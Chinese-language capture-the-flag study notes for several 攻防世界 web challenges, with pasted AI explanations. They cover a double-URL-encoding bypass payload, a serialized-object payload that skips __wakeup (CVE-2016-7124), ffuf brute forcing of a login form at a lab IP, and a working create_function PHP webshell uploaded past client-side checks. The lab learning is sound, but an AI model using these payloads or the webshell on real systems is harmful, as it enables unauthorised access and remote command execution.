### 本文本包含作者在ctf网站中做错的,认为有价值的题目
<details>
<summary>来源/攻防世界 编号GFSJ0234 名称PHP2 | 知识点：phps,百分号编码/解码</summary>

- 首先我们访问index.phps，得到index.php的代码(这个php版本太老了，响应头里写着X-Powered-By: PHP/5.6.37，所以才有了phps这个老古董)
- index.php的代码：
```php
<?php
if("admin"===$_GET[id]) {
  echo("<p>not allowed!</p>");
  exit();
}

$_GET[id] = urldecode($_GET[id]);
if($_GET[id] == "admin")
{
  echo "<p>Access granted!</p>";
  echo "<p>Key: xxxxxxx </p>";
}
?>

Can you anthenticate to this website?
```
- 最开始的错误: 为什么这道题不能用id=0来绕过？另外，chromium浏览器在访问的时候都会自动进行一次urldecode，然后把decode之后的内容传给php吗？为什么这得进行两次php编码？

<details><summary>问题解答</summary>

这是一个经典的 PHP 弱类型比较与 URL 编码绕过的安全题目。我们来逐一分析你的疑问。

### 1. 为什么不能用 `id=0` 绕过？

在 PHP 中，使用 `==`（弱类型比较）时确实存在 `0 == "string"` 为真的情况（尤其是在 PHP 8.0 之前的版本）。但在这道题中，`id=0` 无法绕过，原因有二：

* **第一步的严格检查：** ```php
if("admin"===$_GET[id])
```
这里使用了 `===`（全等运算符）。如果你传入 `id=0`，PHP 会判断整数 `0` 不等于字符串 `"admin"`，虽然能过第一关，但重点在后面。

```


* **第二步的字符串比较：**
```php
if($_GET[id] == "admin")

```


即便这里是 `==`，如果你传入的是 `id=0`（在 URL 中其实是字符串 `"0"`），那么 `"0" == "admin"` 的结果是 **false**。
*只有当一边是数字类型，另一边是字符串时，PHP 才会尝试转换。但在 URL 传参中，所有的输入默认都是字符串。*

---

### 2. Chromium 浏览器会自动进行 `urldecode` 吗？

这是一个常见的误区。**浏览器不会“主动”帮你解码后再发给后端，它做的是“编码”。**

1. **浏览器端：** 当你在地址栏输入特殊字符（如空格、% 等）并回车时，浏览器为了符合 HTTP 传输规范，会将这些字符进行 **URL 编码**。
2. **Web 服务器/PHP 引擎：** 当 PHP 接收到请求并存入 `$_GET` 全局变量时，它会**自动进行一次透明的解码**。

**过程如下：**

* 用户输入：`%61`
* 传输中：`%61`
* PHP 接收 `$_GET['id']`：自动解码，此时变量值已变成 `"a"`。

---

### 3. 为什么需要“两次编码”才能绕过？

这道题的核心逻辑漏洞在于：**在已经自动解码的基础上，代码又手动调用了一次 `urldecode()`。**

我们来看看如何通过两次编码绕过第一步的 `admin` 检查：

1. **构造 Payload：** 我们对 `admin` 中的字符（比如 `a`）进行两次编码。
* `a` 的一次编码：`%61`
* `%61` 的再次编码：`%2561`（把 `%` 编码成 `%25`）


2. **绕过第一步检查：**
* 你传入 `?id=%2561dmin`。
* PHP 自动解码一次，得到 `$_GET['id']` 的值为 `%61dmin`。
* 判断：`"%61dmin" === "admin"` 结果为 **false**，顺利跳过 `exit()`。


3. **进入手动解码：**
* 代码执行：`$_GET[id] = urldecode("%61dmin");`
* 此时变量值变成了 `"admin"`。


4. **绕过第二步检查：**
* 判断：`"admin" == "admin"` 结果为 **true**，拿到 Key。



---

### 总结

这道题考察的是 **"Double URL Decoding"（二次编码绕过）**。

* **失败路径：** 直接传 `admin` -> 被第一个 `if` 拦截 -> `exit`。
* **成功路径：** 传 `%2561dmin` -> 绕过第一个 `if`（因为此时是字符串 `%61...`） -> 经过手动 `urldecode` 变回 `admin` -> 匹配第二个 `if` -> 拿到 Key。

**想试试看吗？你可以尝试把 `a` 换成其他字母的两次编码，效果是一样的。如果你对 PHP 的弱类型比较（Type Juggling）感兴趣，我可以为你展示一份 `==` 的对比表。**
</details>

<details><summary>自动解码相关知识点</summary>

这是一个非常深入的问题。简单来说：**不只是 `$_GET`，所有通过 HTTP 协议传输到 PHP 的标准输入数据，在被填充到超全局变量之前，PHP 解释器都会自动进行一层 URL 解码。**

### 1. 哪些变量会自动解码？

在 PHP 接收到请求时，以下超全局变量中的 **键（Key）** 和 **值（Value）** 都会被自动解码：

* **`$_GET`**: 获取 URL 查询字符串（Query String）中的参数。
* **`$_POST`**: 当 `Content-Type` 为 `application/x-www-form-urlencoded` 时（这是 HTML 表单的默认提交方式）。
* **`$_COOKIE`**: 存储在 HTTP 请求头中的 Cookie 数据。
* **`$_REQUEST`**: 默认包含上述三者的合集。

---

### 2. 为什么会有这种自动机制？

这是由 **RFC 3986 标准** 决定的。在 HTTP 传输中，非字母数字字符（如空格、中文字符、特殊符号）必须经过 URL 编码（Percent-encoding），否则会破坏 HTTP 报文的结构。

例如，当你在浏览器地址栏输入 `?name=Tom%20Wait` 时：

1. **浏览器**：将空格转换为 `%20`。
2. **网络传输**：传输的是 `name=Tom%20Wait`。
3. **PHP 引擎**：在脚本执行前，自动将 `%20` 转回空格。
4. **你的代码**：调用 `$_GET['name']` 得到的是 `"Tom Wait"`。

---

### 3. 哪些情况“不会”自动解码？

了解哪些地方**不解码**对安全研究（绕过 WAF 等）非常重要：

* **`$_SERVER['QUERY_STRING']`**: 这是一个原始字符串。如果你访问 `?id=%61`，`$_GET['id']` 是 `a`，但 `$_SERVER['QUERY_STRING']` 依然是 `id=%61`。
* **`$_SERVER['REQUEST_URI']`**: 包含原始的路径和参数，不会被解码。
* **`php://input` (Raw Post Data)**: 当你使用 `file_get_contents("php://input")` 获取原始 POST 数据时，它是未经过解码的原始报文（除非你自己调用 `urldecode()`）。
* **非标准 Content-Type**: 如果 POST 请求的类型是 `text/plain` 或 `application/json`，PHP 不会将数据填充到 `$_POST` 中，自然也不会有自动解码的过程。

---

### 4. 回到你的那道安全题

正因为 `$_GET` **已经自动解过一次码了**，代码里又写了一句：
`$_GET[id] = urldecode($_GET[id]);`

这导致了**二次解码（Double Decode）**漏洞。

* **第一次解码（PHP 自动）**：将 `%2561` 还原为 `%61`。
* **第二次解码（代码手动）**：将 `%61` 还原为 `a`。

这就是为什么攻击者可以通过“双重编码”来欺骗那些只检查一次字符串的防御逻辑。

**你想了解如何利用 `php://input` 或者 `$_SERVER` 绕过某些特定的安全过滤吗？**
</details>
</details>
<br>
<details>
<summary>来源/攻防世界 编号GFSJ0235 名称unserialize3 | 知识点：serialize,unserialize,__wakeup(),隐藏的GET</summary>

- 题目：
```php
class xctf{
public $flag = '111';
public function __wakeup(){
exit('bad requests');
}
?code=
```
- 最开始思路：由于没咋学过php,只知道这是一个类，flag=111和?code=可能是线索，其余一头雾水。
- 问AI后了解到这个是***反序列化漏洞***,还有***魔数方法***的利用


<details>
<summary>解答</summary>

这串代码是一个经典的 **PHP 反序列化漏洞（Insecure Deserialization）** 题目。虽然代码很短，但考察的是如何绕过 PHP 的魔术方法。

### 核心代码分析

```php
class xctf {
    public $flag = '111';
    public function __wakeup(){
        exit('bad requests');
    }
}

```

1. **类定义**：定义了一个名为 `xctf` 的类，里面有一个属性 `$flag`。
2. **魔术方法 `__wakeup()**`：这是关键点。在 PHP 中，当你使用 `unserialize()` 函数将字符串转换回对象时，如果类中定义了 `__wakeup()`，它会首先被自动调用。
3. **防御机制**：这个 `__wakeup()` 里的 `exit('bad requests')` 意味着一旦你尝试反序列化这个类，程序就会直接报错并退出，你拿不到 `$flag` 的值。

---

### 考察的知识点：CVE-2016-7124

这道题的解题思路在于**如何绕过 `__wakeup()**`。

在 PHP 5 < 5.6.25 和 PHP 7 < 7.0.10 的版本中存在一个漏洞：

> **如果序列化字符串中表示“对象属性个数”的数字大于真实的属性个数，`__wakeup()` 就不会被执行。**

#### 构造 Payload 的步骤：

1. **正常序列化**：
`xctf` 类有一个属性，正常的序列化结果是：
`O:4:"xctf":1:{s:4:"flag";s:3:"111";}`
*(这里的 `1` 代表有 1 个属性)*
2. **修改属性个数（绕过关键）**：
我们将 `1` 改成比 `1` 大的任何数字（比如 `2`）：
`O:4:"xctf":2:{s:4:"flag";s:3:"111";}`

---

### 总结

当你把修改后的 Payload 通过 `?code=` 传入时，PHP 引擎会因为发现属性个数对不上而认为反序列化异常，从而跳过执行 `__wakeup()`，但对象依然会被创建在内存中。如果后端后续有代码读取了该对象的 `$flag` 属性，你就能成功获取 Flag。

**你想让我帮你写一个完整的 PHP 脚本来生成这个绕过的 Payload 字符串吗？**

</details>
</details>
<br>
<details>
<summary>来源/攻防世界 编号GFSJ0333 名称ics-06 | 知识点：暴力破解,ffuf等工具的使用,爆破接入点的寻找</summary>

- 什么是ffuf？
- ffuf的常用参数
    - -t是什么？
    - -fs是什么？
    - -sa是什么？
    - -w是什么？
    - -u是什么？
    - -mc是什么？
- ffuf中爆破点占位符默认有一个，是什么，其英文含义是什么？
- ffuf如何自定义爆破点占位符？
- ffuf如何爆破POST？
- ffuf爆破POST常用参数
    - -X是什么，英文全拼是什么？
    - -d是什么，英文全拼是什么？
    - -H是什么，需要写全吗？
<details>
<summary>ffuf一个省事小技巧</summary>

#### 从 Burp 复制请求<br>
如果你觉得手动打这么多参数太麻烦，可以利用 Burp 的请求包：<br>
在 Burp 中拦截到那个 POST 请求。<br>
将请求内容保存为一个文件，比如 request.txt。<br>
在文件中把你想爆破的位置替换为 FUZZ。<br>
使用 -request 参数直接读取这个文件：
```bash
ffuf -request request.txt -request-proto http -w ./dict.txt -fs 120
```
这种方式最稳妥，因为它会完整保留你原本的所有请求头（Cookies, User-Agent, Token等），成功率最高。<br>
<br>
<details>
<summary>详细讲解</summary>

这是渗透测试中最实用的技巧之一，因为它可以** 1:1 还原浏览器发送的所有请求头**（包括复杂的 Cookie、Token、Referer、User-Agent 等），彻底避免因为参数没模拟对而导致的爆破失败。

### 第一步：在 Burp 中准备原始请求

1. 在 Burp 的 **Proxy** 或 **Repeater** 中找到你想要爆破的请求。
2. 点击右键，选择 **Copy to file**，将其保存为 `request.txt`（或者直接复制内容，用 `vim` 新建一个文件贴进去）。
3. 编辑这个 `request.txt`，把你想要爆破的参数值改为 `FUZZ`。

**文件内容看起来大概是这样的：**

```http
POST /login.php HTTP/1.1
Host: 61.147.171.35:51464
Content-Type: application/x-www-form-urlencoded
Cookie: PHPSESSID=u923...
User-Agent: Mozilla/5.0...

username=admin&password=FUZZ&submit=Login

```

---

### 第二步：使用 ffuf 加载请求文件

使用 `-request` 参数来指定这个文件：

```bash
ffuf -request request.txt -w ./Templates/foo.txt -request-proto http

```

**参数详解：**

* **`-request request.txt`**：告诉 ffuf 直接从这个文件读取整个 HTTP 数据包。
* **`-w`**：指定你的字典。
* **`-request-proto http`**：**（必填项）** ffuf 读取文件时不知道目标是 HTTP 还是 HTTPS，必须显式指定。如果是 443 端口通常用 `https`。

---

### 第三步：进阶配置（处理 HTTPS 和 过滤）

如果你的目标是 HTTPS 或者你需要更精准的过滤，命令如下：

```bash
ffuf -request request.txt -request-proto https -w dict.txt -fs 1234 -sa

```

#### 为什么这个技巧非常强大？

1. **自动处理 Content-Length**：你手动在 POST 爆破时，如果修改了 `FUZZ` 的值，数据的长度会变化。`ffuf` 在使用 `-request` 模式时，会自动帮你计算并更新每发一个包的 `Content-Length` 请求头。
2. **保留所有指纹**：某些 WAF 或后端会检查特殊的 Header（比如特定的反爬虫 Header），直接用 Burp 的包可以完美绕过。
3. **支持多位置爆破**：你可以在 `request.txt` 里放多个标记，比如：
* 在 Cookie 里放一个 `FUZZ` 爆破 Session。
* 在 URL 路径里放一个 `FUZZ`。
* 在 POST 内容里放一个 `FUZZ`。



---

### 常见问题排查

* **路径问题**：确保 `request.txt` 和字典文件路径正确。
* **换行符问题**：如果你是在 Windows 下保存的 `request.txt` 拿到 Linux 下运行，可能会有 `\r\n` 导致的解析错误。建议在 Linux 下用 `cat > request.txt` 粘贴内容。
* **协议指定**：如果忘记写 `-request-proto http`，ffuf 可能会报错或者连接超时。

---

### 💡 绝招：快速生成命令

如果你觉得写路径还是累，你可以直接在 Burp 里安装一个叫 **"Copy as ffuf"** 的插件（在 BApp Store 里有类似的扩展，或者直接用 **"Copy as Curl"** 然后稍微改改），它可以一键生成这种命令。

**要不要我帮你演示一下，如果页面没有任何回显（盲爆），如何通过 ffuf 的响应时间（Time）来判断是否爆破成功？**
</details>
</details>

-----
***题目描述***：开篇给了一句“云平台报表中心收集了设备管理基础服务的数据，但是数据被删除了，只有一处留下了入侵者的痕迹。“，然后就找不到别的信息了。打开在线场景后发现这是一个工控面板管理页面。<br>
***题解***：<br>
- 在里面胡乱点点，发现有一个页面的url参数和其他页面不一样，而且页面中出现了“送分题”字样。
- 那个页面的url参数中包含了?id=1
- 当我们与那个页面进行交互时发现id不变
- 当我们修改url参数时发现id不变，url不变
- 此时我们考虑对id的值进行爆破
- 考虑到id=1,1是整数。所以我们先进行整数爆破
- 使用ffuf/burp等工具爆破
- 当id=2333时response长度不一样，访问id=2333后得到flag
</details>
<br>
<details>
<summary>
来源/攻防世界 编号GFSJ0236 名称upload1 | 知识点：js启停,文件上传,一句话木马,检测函数禁用
</summary>

<details>
<summary>
- ***题目描述***：打开题目后先看到一个输入框，上传文件后发现其对文件后缀等内容进行了检查，但是用js检查的。这时候我们直接禁用js,开始准备一句话木马并上传。此时，意外发生了：诸多经典一句话木马无法使用。
</summary>

- 解法1: 构造合适的find或grep语句来搜索整个根目录，直接找到flag。
- 解法2：先用function_exists看一下，发现eval和assert之类的都被禁用了，看来传统木马的路差不多封死了。
现在我们用create_function来创建一个自定义马,发现没被过滤。直接上antsword开始翻找目录，得到Flag。
</details>
<details>
<summary>
知识点提取
</summary>

- 检查函数能否使用
```php
<?php var_dump(function_exists('system')); ?>
```
- 比较强大的一个自定义木马
```php
<?php
$func = create_function('', $_POST['cmd']);
$func();
?>
```
</details>
</details>
